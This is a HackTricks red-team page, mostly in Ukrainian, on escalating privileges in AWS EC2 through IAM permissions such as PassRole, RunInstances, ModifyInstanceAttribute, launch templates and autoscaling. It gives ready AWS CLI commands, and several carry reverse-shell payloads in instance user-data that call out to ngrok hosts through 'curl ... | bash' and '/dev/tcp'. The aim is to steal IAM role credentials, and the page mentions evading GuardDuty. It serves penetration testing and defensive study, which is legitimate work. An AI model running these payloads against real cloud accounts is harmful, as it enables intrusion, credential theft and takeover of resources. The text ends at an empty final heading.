# AWS - EC2 Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EC2

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –±—ñ–ª—å—à–æ—ó **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ EC2** –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä, –ø—Ä–∏–∫—Ä—ñ–ø–∏–≤—à–∏ IAM —Ä–æ–ª—å, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**, —â–æ–± –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ IAM —Ä–æ–ª—ñ –∑ –∫—ñ–Ω—Ü–µ–≤–æ—ó —Ç–æ—á–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–∏—Ö.

* **–î–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ SSH**

–ó–∞–ø—É—Å—Ç—ñ—Ç—å –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **—Å—Ç–≤–æ—Ä–µ–Ω–∏–π** **ssh –∫–ª—é—á** (`--key-name`), –∞ –ø–æ—Ç—ñ–º –ø—ñ–¥–∫–ª—é—á—ñ—Ç—å—Å—è –¥–æ –Ω—å–æ–≥–æ —á–µ—Ä–µ–∑ ssh (—è–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π, –≤–∞–º –º–æ–∂–µ –∑–Ω–∞–¥–æ–±–∏—Ç–∏—Å—è –¥–æ–∑–≤—ñ–ª `ec2:CreateKeyPair`).
```bash
aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=<instance-profile-name> --key-name <ssh-key> \
--security-group-ids <sg-id>
```
* **–î–æ—Å—Ç—É–ø —á–µ—Ä–µ–∑ rev shell —É –¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**

–í–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** (`--user-data`), —è–∫—ñ –Ω–∞–¥—ñ—à–ª—é—Ç—å –≤–∞–º **rev shell**. –í–∞–º –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –≤–∫–∞–∑—É–≤–∞—Ç–∏ –≥—Ä—É–ø—É –±–µ–∑–ø–µ–∫–∏ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º.
```bash
echo '#!/bin/bash
curl https://reverse-shell.sh/4.tcp.ngrok.io:17031 | bash' > /tmp/rev.sh

aws ec2 run-instances --image-id <img-id> --instance-type t2.micro \
--iam-instance-profile Name=E<instance-profile-name> \
--count 1 \
--user-data "file:///tmp/rev.sh"
```
–ë—É–¥—å—Ç–µ –æ–±–µ—Ä–µ–∂–Ω—ñ –∑ GuradDuty, —è–∫—â–æ –≤–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç–µ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ IAM-—Ä–æ–ª—ñ –ø–æ–∑–∞ –º–µ–∂–∞–º–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞:

{% content-ref url="../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md" %}
[aws-guardduty-enum.md](../aws-services/aws-security-and-detection-services/aws-guardduty-enum.md)
{% endcontent-ref %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ –±—É–¥—å-—è–∫–æ—ó —Ä–æ–ª—ñ EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—ó –¥–æ —ñ—Å–Ω—É—é—á–∏—Ö –ø—Ä–æ—Ñ—ñ–ª—ñ–≤ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

#### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ ECS

–ó —Ü–∏–º –Ω–∞–±–æ—Ä–æ–º –¥–æ–∑–≤–æ–ª—ñ–≤ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –± **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä EC2 —ñ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ ECS**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, **—Å–µ—Ä–≤—ñ—Å–∏** ECS –±—É–¥—É—Ç—å **–∑–∞–ø—É—â–µ–Ω—ñ** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–µ–∫–∑–µ–º–ø–ª—è—Ä–∞ EC2**, –¥–æ —è–∫–æ–≥–æ —É –≤–∞—Å —î –¥–æ—Å—Ç—É–ø, —ñ —Ç–æ–¥—ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –ø—Ä–æ–Ω–∏–∫–Ω—É—Ç–∏ –≤ —Ü—ñ —Å–µ—Ä–≤—ñ—Å–∏ (–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏ docker) —ñ **–≤–∏–∫—Ä–∞—Å—Ç–∏ —ó—Ö —Ä–æ–ª—ñ ECS**. 

{% code overflow="wrap" %}
```bash
aws ec2 run-instances \
--image-id ami-07fde2ae86109a2af \
--instance-type t2.micro \
--iam-instance-profile <ECS_role> \
--count 1 --key-name pwned \
--user-data "file:///tmp/asd.sh"

# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
# The EC2 instance profile needs basic ECS access
# The content of the user data is:
#!/bin/bash
echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
```
{% endcode %}

–©–æ–± –¥—ñ–∑–Ω–∞—Ç–∏—Å—è, —è–∫ **–ø—Ä–∏–º—É—Å–∏—Ç–∏ —Å–ª—É–∂–±–∏ ECS –ø—Ä–∞—Ü—é–≤–∞—Ç–∏** –Ω–∞ —Ü—å–æ–º—É –Ω–æ–≤–æ–º—É EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="aws-ecs-privesc.md" %}
[aws-ecs-privesc.md](aws-ecs-privesc.md)
{% endcontent-ref %}

–Ø–∫—â–æ –≤–∏ **–Ω–µ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä**, –∞–ª–µ –º–∞—î—Ç–µ –¥–æ–∑–≤—ñ–ª `ecs:RegisterContainerInstance`, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä —É –∫–ª–∞—Å—Ç–µ—Ä—ñ —Ç–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–º–µ–Ω—Ç–æ–≤–∞–Ω—É –∞—Ç–∞–∫—É.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª–µ–π ECS, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–≤–¥–∞–Ω—å.

### **`iam:PassRole`,** **`iam:AddRoleToInstanceProfile`**

–ü–æ–¥—ñ–±–Ω–æ –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–≥–æ —Å—Ü–µ–Ω–∞—Ä—ñ—é, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–µ **–∑–º—ñ–Ω–∏—Ç–∏ IAM —Ä–æ–ª—å —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**, —â–æ–± –≤—ñ–Ω –º—ñ–≥ –≤–∫—Ä–∞—Å—Ç–∏ –Ω–æ–≤—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ.\
–û—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–æ–∂–µ –º–∞—Ç–∏ –ª–∏—à–µ 1 —Ä–æ–ª—å, —è–∫—â–æ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ **–≤–∂–µ –º–∞—î —Ä–æ–ª—å** (–ø–æ—à–∏—Ä–µ–Ω–∏–π –≤–∏–ø–∞–¥–æ–∫), –≤–∞–º —Ç–∞–∫–æ–∂ –∑–Ω–∞–¥–æ–±–∏—Ç—å—Å—è **`iam:RemoveRoleFromInstanceProfile`**.

{% code overflow="wrap" %}
```bash
# Removing role from instance profile
aws iam remove-role-from-instance-profile --instance-profile-name <name> --role-name <name>

# Add role to instance profile
aws iam add-role-to-instance-profile --instance-profile-name <name> --role-name <name>
```
{% endcode %}

–Ø–∫—â–æ **–ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –º–∞—î —Ä–æ–ª—å** —ñ –∞—Ç–∞–∫—É—é—á–∏–π **–Ω–µ –º–æ–∂–µ —ó—ó –≤–∏–¥–∞–ª–∏—Ç–∏**, —î —ñ–Ω—à–∏–π –æ–±—Ö—ñ–¥–Ω–∏–π —à–ª—è—Ö. –í—ñ–Ω –º–æ–∂–µ **–∑–Ω–∞–π—Ç–∏** **–ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ –±–µ–∑ —Ä–æ–ª—ñ** –∞–±–æ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–∏–π** (`iam:CreateInstanceProfile`), **–¥–æ–¥–∞—Ç–∏** **—Ä–æ–ª—å** –¥–æ —Ü—å–æ–≥–æ **–ø—Ä–æ—Ñ—ñ–ª—é –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** (—è–∫ –æ–±–≥–æ–≤–æ—Ä—é–≤–∞–ª–æ—Å—è —Ä–∞–Ω—ñ—à–µ) —ñ **–∞—Å–æ—Ü—ñ—é–≤–∞—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** –∑ —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–∏–º i**–Ω—Å—Ç–∞–Ω—Å–æ–º:**

* –Ø–∫—â–æ –µ–∫–∑–µ–º–ø–ª—è—Ä **–Ω–µ –º–∞—î –∂–æ–¥–Ω–æ–≥–æ –ø—Ä–æ—Ñ—ñ–ª—é** –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ (`ec2:AssociateIamInstanceProfile`) \*

{% code overflow="wrap" %}
```bash
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2 (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–ª–∞–º–∞—Ç–∏ AWS EC2 —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—é —Ç–∞ –º–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–æ–∑–≤–æ–ª–∏ –∞–±–æ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π —Å—Ç–∞—Ç—É—Å –ø—Ä–æ—Ñ—ñ–ª—é —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó).

### **`iam:PassRole`((** `ec2:AssociateIamInstanceProfile`& `ec2:DisassociateIamInstanceProfile`) || `ec2:ReplaceIamInstanceProfileAssociation`)

–ó —Ü–∏–º–∏ –¥–æ–∑–≤–æ–ª–∞–º–∏ –º–æ–∂–ª–∏–≤–æ –∑–º—ñ–Ω–∏—Ç–∏ –ø—Ä–æ—Ñ—ñ–ª—å —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó, –∞—Å–æ—Ü—ñ–π–æ–≤–∞–Ω–∏–π –∑ —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—î—é, —Ç–æ–º—É —è–∫—â–æ –∞—Ç–∞–∫–∞ –≤–∂–µ –º–∞–ª–∞ –¥–æ—Å—Ç—É–ø –¥–æ —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó, –≤–æ–Ω–∞ –∑–º–æ–∂–µ –≤–∫—Ä–∞—Å—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –±—ñ–ª—å—à–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Ä–æ–ª–µ–π –ø—Ä–æ—Ñ—ñ–ª—é —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó, –∑–º—ñ–Ω–∏–≤—à–∏ —Ç–æ–π, —â–æ –∞—Å–æ—Ü—ñ–π–æ–≤–∞–Ω–∏–π –∑ –Ω–µ—é.

* –Ø–∫—â–æ **—î –ø—Ä–æ—Ñ—ñ–ª—å —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–¥–∞–ª–∏—Ç–∏** –ø—Ä–æ—Ñ—ñ–ª—å —ñ–Ω—Å—Ç–∞–Ω—Ü—ñ—ó (`ec2:DisassociateIamInstanceProfile`) —ñ **–∞—Å–æ—Ü—ñ—é–≤–∞—Ç–∏** –π–æ–≥–æ \*

{% code overflow="wrap" %}
```bash
aws ec2 describe-iam-instance-profile-associations --filters Name=instance-id,Values=i-0d36d47ba15d7b4da
aws ec2 disassociate-iam-instance-profile --association-id <value>
aws ec2 associate-iam-instance-profile --iam-instance-profile Name=<value> --instance-id <value>
```
{% endcode %}

* –∞–±–æ **–∑–∞–º—ñ–Ω–∏—Ç–∏** **–ø—Ä–æ—Ñ—ñ–ª—å –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–æ–≤–∞–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞ (`ec2:ReplaceIamInstanceProfileAssociation`). \*

{% code overflow="wrap" %}
````
```bash
aws ec2 replace-iam-instance-profile-association --iam-instance-profile Name=<value> --association-id <value>
```
````
{% endcode %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2 (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–ª–∞–º–∞—Ç–∏ AWS EC2 —ñ–Ω—Å—Ç–∞–Ω—Å —ñ –º–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –¥–æ–∑–≤–æ–ª–∏ –∞–±–æ —Å–ø–µ—Ü–∏—Ñ—ñ—á–Ω–∏–π —Å—Ç–∞—Ç—É—Å –ø—Ä–æ—Ñ—ñ–ª—é —ñ–Ω—Å—Ç–∞–Ω—Å–∞).

### `ec2:RequestSpotInstances`,`iam:PassRole`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **`ec2:RequestSpotInstances`—Ç–∞`iam:PassRole`** –º–æ–∂–µ **–∑–∞–ø—Ä–æ—Å–∏—Ç–∏** **Spot Instance** –∑ **–ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—é —Ä–æ–ª–ª—é EC2** —ñ **rev shell** –≤ **–¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**.\
–Ø–∫ —Ç—ñ–ª—å–∫–∏ —ñ–Ω—Å—Ç–∞–Ω—Å –∑–∞–ø—É—Å—Ç–∏—Ç—å—Å—è, –≤—ñ–Ω –º–æ–∂–µ **–≤–∏–∫—Ä–∞—Å—Ç–∏ IAM —Ä–æ–ª—å**.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 request-spot-instances \
--instance-count 1 \
--launch-specification "{\"IamInstanceProfile\":{\"Name\":\"EC2-CloudWatch-Agent-Role\"}, \"InstanceType\": \"t2.micro\", \"UserData\":\"$REV\", \"ImageId\": \"ami-0c1bc246476a5572b\"}"
```
{% endcode %}

### `ec2:ModifyInstanceAttribute`

–ê—Ç–∞–∫—É—é—á–∏–π –∑ **`ec2:ModifyInstanceAttribute`** –º–æ–∂–µ –∑–º—ñ–Ω—é–≤–∞—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤. –°–µ—Ä–µ–¥ –Ω–∏—Ö –≤—ñ–Ω –º–æ–∂–µ **–∑–º—ñ–Ω–∏—Ç–∏ –¥–∞–Ω—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤—ñ–Ω –º–æ–∂–µ –∑–º—É—Å–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω—ñ –¥–∞–Ω—ñ.** –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **rev shell –¥–æ EC2 –µ–∫–∑–µ–º–ø–ª—è—Ä–∞**.

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∞—Ç—Ä–∏–±—É—Ç–∏ –º–æ–∂–Ω–∞ **–∑–º—ñ–Ω—é–≤–∞—Ç–∏ –ª–∏—à–µ —Ç–æ–¥—ñ, –∫–æ–ª–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä –∑—É–ø–∏–Ω–µ–Ω–æ**, —Ç–æ–º—É **–¥–æ–∑–≤–æ–ª–∏** **`ec2:StopInstances`** —Ç–∞ **`ec2:StartInstances`**.
```bash
TEXT='Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
bash -i >& /dev/tcp/2.tcp.ngrok.io/14510 0>&1
--//'
TEXT_PATH="/tmp/text.b64.txt"

printf $TEXT | base64 > "$TEXT_PATH"

aws ec2 stop-instances --instance-ids $INSTANCE_ID

aws ec2 modify-instance-attribute \
--instance-id="$INSTANCE_ID" \
--attribute userData \
--value file://$TEXT_PATH

aws ec2 start-instances --instance-ids $INSTANCE_ID
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ –±—É–¥—å-—è–∫–æ—ó EC2 IAM —Ä–æ–ª—ñ, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–æ—ó –¥–æ —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞.

### `ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`,`ec2:ModifyLaunchTemplate`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ **`ec2:CreateLaunchTemplateVersion`,`ec2:CreateLaunchTemplate`—Ç–∞ `ec2:ModifyLaunchTemplate`** –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–Ω–æ–≤—É –≤–µ—Ä—Å—ñ—é —à–∞–±–ª–æ–Ω—É –∑–∞–ø—É—Å–∫—É** –∑ **—Ä–µ–≤–µ—Ä—Å–Ω–æ—é –æ–±–æ–ª–æ–Ω–∫–æ—é** –≤ **–¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** —Ç–∞ **–±—É–¥—å-—è–∫–æ—é EC2 IAM —Ä–æ–ª–ª—é –Ω–∞ –Ω—å–æ–º—É**, –∑–º—ñ–Ω–∏—Ç–∏ –≤–µ—Ä—Å—ñ—é –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —ñ **–±—É–¥—å-—è–∫–∞ –≥—Ä—É–ø–∞ –∞–≤—Ç–æ—Å–∫–∞–ª–µ—Ä–∞**, **—è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î** —Ü–µ–π **—à–∞–±–ª–æ–Ω –∑–∞–ø—É—Å–∫—É**, —â–æ **–Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π** –Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **–æ—Å—Ç–∞–Ω–Ω—ñ–π** –∞–±–æ **–≤–µ—Ä—Å—ñ—ó –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, –±—É–¥–µ **–∑–Ω–æ–≤—É –∑–∞–ø—É—Å–∫–∞—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü–µ–π —à–∞–±–ª–æ–Ω, —ñ –≤–∏–∫–æ–Ω–∞—î —Ä–µ–≤–µ—Ä—Å–Ω—É –æ–±–æ–ª–æ–Ω–∫—É.

{% code overflow="wrap" %}
```bash
REV=$(printf '#!/bin/bash
curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | bash
' | base64)

aws ec2 create-launch-template-version \
--launch-template-name bad_template \
--launch-template-data "{\"ImageId\": \"ami-0c1bc246476a5572b\", \"InstanceType\": \"t3.micro\", \"IamInstanceProfile\": {\"Name\": \"ecsInstanceRole\"}, \"UserData\": \"$REV\"}"

aws ec2 modify-launch-template \
--launch-template-name bad_template \
--default-version 2
```
{% endcode %}

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2.

### `autoscaling:CreateLaunchConfiguration`, `autoscaling:CreateAutoScalingGroup`, `iam:PassRole`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –ø—Ä–∞–≤–∞–º–∏ **`autoscaling:CreateLaunchConfiguration`,`autoscaling:CreateAutoScalingGroup`,`iam:PassRole`** –º–æ–∂–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –∑–∞–ø—É—Å–∫—É** –∑ **IAM —Ä–æ–ª–ª—é** —Ç–∞ **rev shell** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞**, –ø–æ—Ç—ñ–º **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –≥—Ä—É–ø—É –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –º–∞—Å—à—Ç–∞–±—É–≤–∞–Ω–Ω—è** –∑ —Ü—ñ—î—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞ —á–µ–∫–∞—Ç–∏, –ø–æ–∫–∏ rev shell **–≤–∫—Ä–∞–¥–µ IAM —Ä–æ–ª—å**.
```bash
aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-launch-configuration \
--launch-configuration-name bad_config \
--image-id ami-0c1bc246476a5572b \
--instance-type t3.micro \
--iam-instance-profile EC2-CloudWatch-Agent-Role \
--user-data "$REV"

aws --profile "$NON_PRIV_PROFILE_USER" autoscaling create-auto-scaling-group \
--auto-scaling-group-name bad_auto \
--min-size 1 --max-size 1 \
--launch-configuration-name bad_config \
--desired-capacity 1 \
--vpc-zone-identifier "subnet-e282f9b8"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —ñ–Ω—à–æ—ó —Ä–æ–ª—ñ EC2.

### `!autoscaling`

–ù–∞–±—ñ—Ä –¥–æ–∑–≤–æ–ª—ñ–≤ **`ec2:CreateLaunchTemplate`** —Ç–∞ **`autoscaling:CreateAutoScalingGroup`** **–Ω–µ —î –¥–æ—Å—Ç–∞—Ç–Ω—ñ–º–∏ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è** –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ —Ä–æ–ª—ñ IAM, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–ª—è –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–Ω—è —Ä–æ–ª—ñ, –∑–∞–∑–Ω–∞—á–µ–Ω–æ—ó –≤ –ö–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –∑–∞–ø—É—Å–∫—É –∞–±–æ –≤ –®–∞–±–ª–æ–Ω—ñ –∑–∞–ø—É—Å–∫—É, **–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ `iam:PassRole` —Ç–∞ `ec2:RunInstances`** (—â–æ —î –≤—ñ–¥–æ–º–∏–º –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è–º –ø—Ä–∏–≤—ñ–ª–µ—ó–≤).

### `ec2-instance-connect:SendSSHPublicKey`

